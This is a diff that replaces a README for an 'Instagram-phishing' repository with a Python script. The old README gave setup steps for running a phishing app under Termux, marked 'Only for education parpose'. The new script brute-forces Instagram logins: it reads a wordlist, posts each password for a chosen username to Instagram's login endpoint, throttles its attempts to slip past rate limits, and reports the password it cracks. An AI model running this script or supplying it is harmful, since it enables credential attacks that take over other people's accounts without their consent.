@@ -1,49 +1,68 @@
-# Instagram-phishing-
-Only for education parpose 
+import requests
+import time
 
+# Function to check the Instagram password
+def check_password(username, password):
+    url = f"https://www.instagram.com/accounts/login/ajax/"
+    session = requests.Session()
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+    }
 
+    # Simulate login form
+    data = {
+        'username': username,
+        'password': password,
+    }
 
-Step-by-Step Guide
+    try:
+        # Sending login request
+        response = session.post(url, headers=headers, data=data)
+        if response.status_code == 200 and 'authenticated' in response.text:
+            return True
+        else:
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f"Error occurred: {e}")
+        return None
 
-1. Update Termux Packages:
+# Function to display the found password with a border
+def display_found_password(password):
+    border = "=" * (len(password) + 6)
+    print(f"\n{border}\n= Found Password: {password} =\n{border}")
 
-pkg update && pkg upgrade -y
+# Function to process the wordlist and attempt password cracking
+def crack_password(username, wordlist):
+    try:
+        with open(wordlist, 'r') as file:
+            passwords = file.readlines()
+            attempt_count = 0
 
+            for password in passwords:
+                password = password.strip()
+                attempt_count += 1
 
-2. Install Required Tools:
+                # Check every 100 passwords per second
+                if attempt_count % 100 == 0:
+                    time.sleep(1)
 
-pkg install git python -y
+                print(f"Attempting: {password}")
+                result = check_password(username, password)
 
+                if result is None:
+                    print("Error: Could not complete the request.")
+                elif result:
+                    display_found_password(password)
+                    break
+    except FileNotFoundError:
+        print("Error: Wordlist file not found.")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
 
-3. Clone the Repository:
+# Main execution
+if __name__ == "__main__":
+    username = input("Enter Instagram username: ")
+    wordlist = input("Enter the path of your wordlist: ")
 
-git clone https://github.com/EgaleX5/Instagram-phishing-.git
-
-Ensure karein ki cloning successful hai:
-
-ls
-
-
-4. Navigate to the Directory:
-
-cd Instagram-phishing-
-
-
-5. Install Dependencies:
-
-pip install -r requirements.txt
-
-Agar requirements.txt nahi hai, manually dependencies install karein:
-
-pip install flask requests
-
-
-6. Run the Script:
-
-python3 app.py
-
-
-
-
----
-
+    crack_password(username, wordlist)
